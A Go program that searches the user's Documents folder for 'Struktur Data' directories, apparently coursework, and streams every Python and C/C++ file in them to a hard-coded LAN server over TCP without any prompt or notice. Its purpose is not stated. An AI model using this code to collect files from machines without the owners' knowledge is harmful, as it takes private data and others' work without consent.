package main

import (
    "fmt"
    "io"
    "log"
    "net"
    "os"
    "path/filepath"
    "strings"
)

const (
    SERVER_IP   = "192.168.2.50"
    SERVER_PORT = "8080"
    BUFFER_SIZE = 1024
)

type FileInfo struct {
    Name string
    Path string
    Size int64
}

func main() {
    // Setup logging
    logFile, err := os.OpenFile("file_transfer.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal(err)
    }
    defer logFile.Close()
    logger := log.New(logFile, "", log.LstdFlags)

    // Get user's Documents folder
    documentsPath, err := getDocumentsPath()
    if err != nil {
        logger.Fatal("Error getting Documents path:", err)
    }

    // Find relevant files
    files, err := findRelevantFiles(documentsPath, logger)
    if err != nil {
        logger.Fatal("Error finding files:", err)
    }

    // Send files
    for _, file := range files {
        if err := sendFile(file, logger); err != nil {
            logger.Printf("Error sending file %s: %v", file.Name, err)
            continue
        }
        logger.Printf("Successfully sent file: %s", file.Name)
    }
}

func getDocumentsPath() (string, error) {
    homeDir, err := os.UserHomeDir()
    if err != nil {
        return "", err
    }
    return filepath.Join(homeDir, "Documents"), nil
}

func findRelevantFiles(rootPath string, logger *log.Logger) ([]FileInfo, error) {
    var files []FileInfo

    err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return nil // Skip files we can't access
        }

        // Check if directory contains "Struktur Data"
        if info.IsDir() && strings.Contains(info.Name(), "Struktur Data") {
            // Find Python and C++ files in this directory
            err := filepath.Walk(path, func(subPath string, subInfo os.FileInfo, err error) error {
                if err != nil {
                    return nil
                }

                if !subInfo.IsDir() {
                    ext := strings.ToLower(filepath.Ext(subPath))
                    if ext == ".py" || ext == ".cpp" || ext == ".c" {
                        files = append(files, FileInfo{
                            Name: subInfo.Name(),
                            Path: subPath,
                            Size: subInfo.Size(),
                        })
                        logger.Printf("Found file: %s", subPath)
                    }
                }
                return nil
            })
            if err != nil {
                logger.Printf("Error scanning directory %s: %v", path, err)
            }
        }
        return nil
    })

    return files, err
}

func sendFile(file FileInfo, logger *log.Logger) error {
    // Connect to server
    conn, err := net.Dial("tcp", SERVER_IP+":"+SERVER_PORT)
    if err != nil {
        return fmt.Errorf("error connecting to server: %v", err)
    }
    defer conn.Close()

    // Open file
    f, err := os.Open(file.Path)
    if err != nil {
        return fmt.Errorf("error opening file: %v", err)
    }
    defer f.Close()

    // Send file metadata
    metadata := fmt.Sprintf("%s|%d\n", file.Name, file.Size)
    if _, err := conn.Write([]byte(metadata)); err != nil {
        return fmt.Errorf("error sending metadata: %v", err)
    }

    // Send file content
    buffer := make([]byte, BUFFER_SIZE)
    for {
        n, err := f.Read(buffer)
        if err == io.EOF {
            break
        }
        if err != nil {
            return fmt.Errorf("error reading file: %v", err)
        }

        _, err = conn.Write(buffer[:n])
        if err != nil {
            return fmt.Errorf("error sending file data: %v", err)
        }
    }

    return nil
}